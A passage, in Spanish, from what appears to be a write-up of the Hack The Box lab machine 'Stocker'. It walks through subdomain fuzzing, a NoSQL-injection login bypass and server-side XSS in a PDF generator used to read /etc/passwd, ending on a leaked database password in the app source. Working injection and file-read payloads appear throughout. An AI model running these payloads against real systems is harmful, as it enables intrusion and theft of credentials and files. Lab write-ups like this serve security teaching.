</pre></td><td class="rouge-code"><pre>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>15463 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> <span class="s2">"http://stocker.htb/FUZZ"</span>
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://stocker.htb/FUZZ
Total requests: 220560
=====================================================================
ID           Response   Lines    Word       Chars       Payload                              
=====================================================================
000000039:   301        7 L      12 W       178 Ch      "img"                             
000000550:   301        7 L      12 W       178 Ch      "css"                                                           
000000953:   301        7 L      12 W       178 Ch      "js"                                                                     
000002771:   301        7 L      12 W       178 Ch      "fonts"
</span></pre></td></tr></tbody></table></code></div></div>

<p class="nolineno">En esta parte encontramos cosas tipicas que existen en una web, sin embargo no son de relevancia. Tener una buena metodologia de enumeracion hace que puedas llegar mas alla y conseguir muchas vias de explotacion.</p>

<h3 id="enumeracion-web-fuzz-domain"><span class="me-2">Enumeracion Web Fuzz Domain</span><a href="#enumeracion-web-fuzz-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>178,166 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-H</span> <span class="s2">"Host: FUZZ.stocker.htb"</span> http://stocker.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://stocker.htb/
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                         
=====================================================================
000000834:   302        0 L      4 W        28 Ch       "dev"
</span></pre></td></tr></tbody></table></code></div></div>

<p>Fuzzeamos en la parte donde van los subdominios y encontramos <code class="language-plaintext highlighter-rouge">dev.stocker.htb</code>, vamos a incorporarlo a nuestro <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y ver que nos resuelve la web.</p>

<div class="language-bash nolineno nolineno highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>curl http://dev.stocker.htb <span class="nt">-I</span> <span class="nt">-v</span>
<span class="k">*</span> Host dev.stocker.htb:80 was resolved.
<span class="k">*</span> IPv6: <span class="o">(</span>none<span class="o">)</span>
<span class="k">*</span> IPv4: 10.10.11.196
<span class="k">*</span>   Trying 10.10.11.196:80...
<span class="k">*</span> Connected to dev.stocker.htb <span class="o">(</span>10.10.11.196<span class="o">)</span> port 80
<span class="o">&gt;</span> HEAD / HTTP/1.1
<span class="o">&gt;</span> Host: dev.stocker.htb
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> 
&lt; HTTP/1.1 302 Found
HTTP/1.1 302 Found
&lt; Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Date: Mon, 29 Apr 2024 12:59:32 GMT
Date: Mon, 29 Apr 2024 12:59:32 GMT
&lt; Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
&lt; Content-Length: 28
Content-Length: 28
&lt; Connection: keep-alive
Connection: keep-alive
&lt; X-Powered-By: Express
X-Powered-By: Express
&lt; Location: /login
Location: /login
&lt; Vary: Accept
Vary: Accept
&lt; Set-Cookie: connect.sid<span class="o">=</span>s%3AAqXpouaZNkKv1VkwiWJNKGzTULe4csBN.pelTgGT%2BuVN9nhF7WPaBGq5y2pltzSvT43wY9wWX0rQ<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
Set-Cookie: connect.sid<span class="o">=</span>s%3AAqXpouaZNkKv1VkwiWJNKGzTULe4csBN.pelTgGT%2BuVN9nhF7WPaBGq5y2pltzSvT43wY9wWX0rQ<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
</pre></td></tr></tbody></table></code></div></div>

<p>Es importante observar cada detalle de la web que estamos auditando, asi podemos deducir el lenguaje con el que esta programado la aplicacion web.</p>

<p class="nolineno"><a href="/assets/img/htb-writeup-stocker/stocker2.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker2.png" alt="" loading="lazy"></a></p>

<p class="nolineno">Tenemos un panel de acceso a login, puede ser vulnerable a SQL injection o NoSQL injection, vamos a comprobarlo ahora, hay mas probabilidad de que sea vulnerable a NoSQLI por diferentes motivos, una de ellas es que en las tecnologias que implementa aplicacion web es que esta desarrollado en Express JS y NodeJS, maneja entradas de application/json</p>

<h3 id="sql-injection"><span class="me-2">SQL Injection</span><a href="#sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>curl dev.stocker.htb/login <span class="nt">-d</span> <span class="s2">"username='&amp;password=test"</span><span class="p">;</span> <span class="nb">echo
</span>Found. Redirecting to /login?error<span class="o">=</span>login-error

curl dev.stocker.htb/login <span class="nt">-d</span> <span class="s2">"username='+or+1=1--+-&amp;password=test"</span><span class="p">;</span> <span class="nb">echo
</span>Found. Redirecting to /login?error<span class="o">=</span>login-error

curl dev.stocker.htb/login <span class="nt">-d</span> <span class="s2">"username='+or+sleep(10)--+-&amp;password=test"</span><span class="p">;</span> <span class="nb">echo
</span>Found. Redirecting to /login?error<span class="o">=</span>login-error

curl dev.stocker.htb/login <span class="nt">-d</span> <span class="s1">$'{"username":"</span><span class="se">\'</span><span class="s1">","password":"test"}'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span><span class="p">;</span> <span class="nb">echo
</span>Found. Redirecting to /login?error<span class="o">=</span>login-error

curl dev.stocker.htb/login <span class="nt">-d</span> <span class="s1">$'{"username":"</span><span class="se">\'</span><span class="s1"> or 1=1-- -","password":"test"}'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span><span class="p">;</span> <span class="nb">echo
</span>Found. Redirecting to /login?error<span class="o">=</span>login-error
</pre></td></tr></tbody></table></code></div></div>

<p>Siempre que vemos un panel de acceso quiero intentar bypassearlo de diferentes maneras, ya sea Inyecciones SQL o NoSQL (<code class="language-plaintext highlighter-rouge">'</code>,<code class="language-plaintext highlighter-rouge">"</code>) pero como dije antes, estas inyecciones fallaron porque creemos que por detras existe un Mongo DB y no un MySQL como base de datos, quiere decir que la vulnerabilidad puede estar por un NoSQLI</p>

<h3 id="nosql-injection-y-bypass-authentication"><span class="me-2">NoSQL Injection y Bypass Authentication</span><a href="#nosql-injection-y-bypass-authentication" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>curl dev.stocker.htb/login <span class="nt">-d</span> <span class="s1">'username[$ne]=test&amp;password[$ne]=test'</span><span class="p">;</span> <span class="nb">echo
</span>Found. Redirecting to /login?error<span class="o">=</span>login-error
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>curl dev.stocker.htb/login <span class="nt">-d</span> <span class="s1">$'{"username":{"$ne":"test"},"password":{"$ne":"test"}}'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span><span class="p">;</span> <span class="nb">echo
</span>Found. Redirecting to /stock
</pre></td></tr></tbody></table></code></div></div>

<p>Ya tenemos una inyeccion exitosa, es importante que en la peticion agreguemos la cabezera <code class="language-plaintext highlighter-rouge">Content-Type: application/json</code> porque estamos enviando data en formato <code class="language-plaintext highlighter-rouge">json</code>, vamos reenviarlo por el puerto 127.0.0.1:8080 al burpsuite desde curl</p>

<p>Este es el payload que usamos en la inyeccion para bypassear la autenticacion</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">{</span><span class="s2">"username"</span>:<span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: <span class="s2">"test"</span><span class="o">}</span>, <span class="s2">"password"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>:<span class="s2">"test"</span><span class="o">}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Esto hara lo siguiente: siempre que haya al menos un usuario que no sea “test” y una contraseña que no sea “test”, ese usuario sera devuelto y iniciara sesion.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl dev.stocker.htb/login <span class="nt">-d</span> <span class="s1">$'{"username":{"$ne":"test"},"password":{"$ne":"test"}}'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">--proxy</span> http://127.0.0.1:8080
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-stocker/stocker3.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker3.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-stocker/stocker4.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker4.png" alt="" loading="lazy"></a></p>

<p>copiamos y pegamos la cookie de sesion y ya bypasseamos el panel de login</p>

<p><a href="/assets/img/htb-writeup-stocker/stocker5.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker5.png" alt="" loading="lazy"></a></p>

<p>Parece una aplicación web para comprar cosas raras. Hay 4 articulos en la web que Podemos agregar al carrito de compras.</p>

<p><a href="/assets/img/htb-writeup-stocker/stocker6.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker6.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-stocker/stocker7.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker7.png" alt="" loading="lazy"></a></p>

<p>cuando hacemos click en ver carrito, se nos abre esta ventana indicando todos los componentes que agregamos. Vamos a darle a submit purchase</p>

<p><a href="/assets/img/htb-writeup-stocker/stocker8.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker8.png" alt="" loading="lazy"></a></p>

<p>Vemos un enlace en <code class="language-plaintext highlighter-rouge">here</code> que nos reedirige a <code class="language-plaintext highlighter-rouge">http://dev.stocker.htb/api/po/63c87d31d6a42c59f2d7659a</code> un comprobante de pago en PDF, esto nos resuelve a una api que esta a la vista del publico y expuesta. Para desglosar el PDF y ver el origen del mismo, procedemos al descargo y comprobar con exiftool de que se trata.</p>

<p><a href="/assets/img/htb-writeup-stocker/stocker9.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker9.png" alt="" loading="lazy"></a></p>

<p>Si ejecutamos exiftool en este documento, veremos que se genera usando Chromium (Skia/PDF m108):</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> dev.stocker.htb/api/po/63c87d31d6a42c59f2d7659a | exiftool -  
ExifTool Version Number         : 12.50
File Size                       : 0 bytes
File Modification Date/Time     : 2023:01:14 00:00:00+01:00
File Access Date/Time           : 2023:01:14 00:00:00+01:00
File Inode Change Date/Time     : 2023:01:14 00:00:00+01:00
File Permissions                : prw-rw----
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:01:13 23:00:00+00:00
Modify Date                     : 2023:01:13 23:00:00+00:00
</pre></td></tr></tbody></table></code></div></div>

<p>en <code class="language-plaintext highlighter-rouge">/stocks</code> existe un flujo de peticiones importantes como <code class="language-plaintext highlighter-rouge">/api/products</code>, muestra toda la informacion sobre los productos que vende la aplicacion web</p>

<p><a href="/assets/img/htb-writeup-stocker/stocker10.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker10.png" alt="" loading="lazy"></a></p>

<p>El comportamiento de esta aplicacion web es agregar un articulo a mi carrito y destella una ventana emergente, sin embargo no llega a enviar ninguna solicitud, por lo que ni siquiera se almacena de manera local, sino simplemente en el JavaScript del lado del cliente en ejecución.</p>

<p>Interceptamos el boton <code class="language-plaintext highlighter-rouge">submit purchase</code></p>

<p><a href="/assets/img/htb-writeup-stocker/stocker11.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker11.png" alt="" loading="lazy"></a></p>

<p>incluye los articulos a comprar y algunos campos que podemos modificar y ver como se comporta la web.</p>

<p><a href="/assets/img/htb-writeup-stocker/stocker12.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker12.png" alt="" loading="lazy"></a></p>

<p>en la anterior imagen modificamos el valor de <code class="language-plaintext highlighter-rouge">amount</code> a no poner nada y dejarlo vacio, esto provoco un error en la web y nos devolvio algunas rutas que podriamos aprovechar si logramos conseguir algun <code class="language-plaintext highlighter-rouge">File Inclusion</code>.</p>

<h3 id="xss"><span class="me-2">XSS</span><a href="#xss" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Hay una carga util que podemos utilizar para comprobar si es vulnerable a XSS.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>&lt;img <span class="nv">src</span><span class="o">=</span><span class="se">\"</span>x<span class="se">\"</span> <span class="nv">onerror</span><span class="o">=</span><span class="se">\"</span>document.write<span class="o">(</span><span class="s1">'test'</span><span class="o">)</span><span class="se">\"</span> /&gt;
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-stocker/stocker13.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker13.png" alt="" loading="lazy"></a></p>

<p>Y porque elegimos el campo <code class="language-plaintext highlighter-rouge">title</code>?, es simple. Porque ese campo se ve reflejado en el comprobante de pago del PDF que generamos.</p>

<p>La web informa que la compra se realizo correctamente. Al visitar la URL de esa orden de compra ( /api/po/[id]) muestra que funciono:</p>

<p><a href="/assets/img/htb-writeup-stocker/stocker14.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker14.png" alt="" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">test</code> sobrescribio todo el resto del HTML/CSS que estaba creando el PDF.</p>

<h3 id="read-local-file"><span class="me-2">Read Local File</span><a href="#read-local-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Ya tenemos identificada la vulnerabilidad de XSS pero aparte de eso podemos derivarlo a una Lectura de archivos locales, de que manera logramos dicho objetivo?. Si una página web está creando un PDF utilizando una entrada controlada por el usuario, puedes intentar engañar al bot que está creando el PDF para que ejecute código JS arbitrario. Entonces, si el bot creador de PDF encuentra algún tipo de etiquetas HTML, las interpretará y puede abusar de este comportamiento para provocar un XSS en el servidor. <a href="https://n3t-hunt3r.gitbook.io/pentest-book/web-application-pentesting/xss-cross-site-scripting/server-side-xss-less-than-dynamic-pdf-greater-than">Read Local File</a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>&lt;script&gt;
<span class="nv">x</span><span class="o">=</span>new XMLHttpRequest<span class="p">;</span>
x.onload<span class="o">=</span><span class="k">function</span><span class="o">(){</span>document.write<span class="o">(</span>btoa<span class="o">(</span>this.responseText<span class="o">))}</span><span class="p">;</span>
x.open<span class="o">(</span><span class="s2">"GET"</span>,<span class="s2">"file:///etc/passwd"</span><span class="o">)</span><span class="p">;</span>x.send<span class="o">()</span><span class="p">;</span>
&lt;/script&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>tenemos que escapar las comillas dobles porque si no no funciona el payload</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>&lt;script&gt;x<span class="o">=</span>new XMLHttpRequest<span class="p">;</span>x.onload<span class="o">=</span><span class="k">function</span><span class="o">(){</span>document.write<span class="o">(</span>btoa<span class="o">(</span>this.responseText<span class="o">))}</span><span class="p">;</span>x.open<span class="o">(</span><span class="se">\"</span>GET<span class="se">\"</span>,<span class="se">\"</span>file:///etc/passwd<span class="se">\"</span><span class="o">)</span><span class="p">;</span>x.send<span class="o">()</span><span class="p">;</span>&lt;/script&gt;
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-stocker/stocker15.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker15.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-stocker/stocker16.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker16.png" alt="" loading="lazy"></a></p>

<p>En el comprobante de pago vemos lo siguiente: una cadena codificada en base64, vamos a decodificarla con el siguiente comando</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usrbase64: entrada inválida
</pre></td></tr></tbody></table></code></div></div>

<p>Excelente!!! Vemos el /etc/passwd, en este punto ya podemos decir que estamos ante un File Inclusion y podemos ver archivos del sistema, lo siguiente sera ver el codigo fuente para escalar esta vulnerabilidad.</p>

<p>Pero vemos solo una parte del /etc/passwd, es decir solo las primeras 3 lineas. Para verlo completo podemos inyectar este payload:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>&lt;iframe <span class="nv">src</span><span class="o">=</span>file:///etc/passwd&gt;&lt;/iframe&gt;
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-stocker/stocker17.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker17.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-stocker/stocker18.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker18.png" alt="" loading="lazy"></a></p>

<p>Otro payload que puede funcionar y tener un mejor resultado a la hora de leer archivos internos de la maquina es este</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>&lt;img <span class="nv">src</span><span class="o">=</span><span class="se">\"</span>x<span class="se">\"</span> <span class="nv">onerror</span><span class="o">=</span><span class="se">\"</span>document.write<span class="o">(</span><span class="s1">'&lt;iframe src=file:///etc/passwd width=100% height=100%&gt;&lt;/iframe&gt;'</span><span class="o">)</span><span class="se">\"</span> /&gt;
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-stocker/stocker19.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-stocker/stocker19.png" alt="" loading="lazy"></a></p>

<p>Ya que tenemos perfeccionado lo de leer correctamente los archivos, quedaria tratar de leer el codigo fuente de la aplicacion web “index.js” de <code class="language-plaintext highlighter-rouge">/var/www/dev/index.js</code></p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">express</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">mongoose</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">mongoose</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">express-session</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">MongoStore</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">connect-mongo</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">path</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">fs</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span>
    <span class="nx">generatePDF</span><span class="p">,</span>
    <span class="nx">formatHTML</span>
<span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">./pdf.js</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span>
    <span class="nx">randomBytes</span><span class="p">,</span>
    <span class="nx">createHash</span>
<span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">crypto</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span><span class="p">;</span>
<span class="c1">// TODO: Configure loading from dotenv for production</span>
<span class="kd">const</span> <span class="nx">dbURI</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?
authSource = admin &amp; w = 1 </span><span class="dl">"</span><span class="p">;</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nf">json</span><span class="p">());</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nf">urlencoded</span><span class="p">({</span>
    <span class="na">extended</span><span class="p">:</span> <span class="kc">false</span>
<span class="p">}));</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span>
    <span class="nf">session</span><span class="p">({</span>
        <span class="na">secret</span><span class="p">:</span> <span class="nf">randomBytes</span><span class="p">(</span><span class="mi">32</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">),</span>
        <span class="na">resave</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="na">saveUninitialized</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="na">store</span><span class="p">:</span> <span class="nx">MongoStore</span><span class="p">.</span><span class="nf">create</span><span class="p">({</span>
            <span class="na">mongoUrl</span><span class="p">:</span> <span class="nx">dbURI</span><span class="p">,</span>
        <span class="p">}),</span>
    <span class="p">})</span>
<span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">"</span><span class="s2">/static</span><span class="dl">"</span><span class="p">,</span> <span class="nx">express</span><span class="p">.</span><span class="nf">static</span><span class="p">(</span><span class="nx">__dirname</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/assets</span><span class="dl">"</span><span class="p">));</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">);</span>
<span class="p">});</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/products</span><span class="dl">"</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">([]);</span>
